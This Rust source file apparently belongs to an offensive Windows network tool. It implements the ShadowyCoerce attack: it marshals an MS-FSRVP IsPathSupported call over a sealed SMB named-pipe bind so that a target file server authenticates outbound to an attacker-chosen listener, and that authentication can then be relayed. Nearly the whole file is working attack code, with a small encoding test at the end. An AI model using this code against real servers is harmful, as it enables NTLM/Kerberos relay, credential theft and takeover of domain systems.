//! MS-FSRVP coercion (ShadowyCoerce) — `IsPathSupported` forces the VSS/File-Server-Remote-VSS
//! provider on the target to reach the given `ShareName`, triggering outbound NTLM/Kerberos
//! auth (relayable). Rides the SMB named-pipe DCE/RPC transport on `\FssagentRpc`.
//!
//! Needs the File Server VSS Agent Service enabled on the target (default off on plain DCs, on
//! for many file servers / when the role is installed).

use crate::ndr::NdrEncoder;
use crate::transport::SmbPipe;
use crate::{Result, Syntax};
use smb2_client::SmbClient;

/// The FileServerVssAgent interface (MS-FSRVP), v1.0.
pub fn fsrvp_syntax() -> Syntax {
    Syntax::new("a8e0653c-2744-4389-a61d-7373df8b2292", 1, 0)
}

/// `IsPathSupported` — opnum 8.
pub const OPNUM_IS_PATH_SUPPORTED: u16 = 8;

/// `IsPathSupported(ShareName [in,string])` — the VSS provider tries to reach ShareName,
/// authenticating outbound.
pub fn encode_is_path_supported(share_name: &str) -> Vec<u8> {
    let mut e = NdrEncoder::new();
    e.referent();
    e.conformant_varying_wstr(share_name);
    e.into_bytes()
}

pub struct CoerceClient<'a> {
    pipe: SmbPipe<'a>,
}

impl<'a> CoerceClient<'a> {
    /// Sealed bind — MS-FSRVP 3.1.4 enforces PKT_PRIVACY (the VSS agent otherwise faults
    /// with `nca_s_fault_ndr` or returns ACCESS_DENIED). Reuses the SMB session's credentials.
    pub async fn bind_sealed(
        client: &'a mut SmbClient,
        file_id: [u8; 16],
        domain: &str,
        user: &str,
        password: &str,
        host: &str,
    ) -> Result<Self> {
        let mut pipe = SmbPipe::new(client, file_id);
        pipe.bind_sealed(fsrvp_syntax(), domain, user, password, host)
            .await?;
        Ok(CoerceClient { pipe })
    }

    /// Fire `IsPathSupported` at `\\listener\share`. Returns the HRESULT — a non-fault
    /// response means the target processed the call (coercion attempted). Full auth capture
    /// requires a relay/listener on the attacker host (out of tool scope).
    pub async fn coerce(&mut self, listener: &str) -> Result<u32> {
        let share = format!("\\\\{listener}\\share\\");
        let resp = self
            .pipe
            .call_sealed(OPNUM_IS_PATH_SUPPORTED, &encode_is_path_supported(&share))
            .await?;
        // Reply: SupportedByThisProvider (BOOL / u32) + OwnerMachineName ptr (+ deferred string)
        // + HRESULT trailer. Only the tail HRESULT tells us the call succeeded / was processed.
        let status = resp
            .len()
            .checked_sub(4)
            .and_then(|o| resp.get(o..o + 4))
            .map(|b| u32::from_le_bytes(b.try_into().unwrap()))
            .unwrap_or(0);
        Ok(status)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_path_supported_marshals_referent_and_string() {
        let stub = encode_is_path_supported("\\\\10.0.0.1\\share\\");
        assert_ne!(u32::from_le_bytes(stub[0..4].try_into().unwrap()), 0);
        // conformant-varying wstr = max_count(4) + offset(4) + actual_count(4) + units
        let max = u32::from_le_bytes(stub[4..8].try_into().unwrap());
        let actual = u32::from_le_bytes(stub[12..16].try_into().unwrap());
        assert_eq!(max, actual);
        assert!(actual > 0);
    }
}
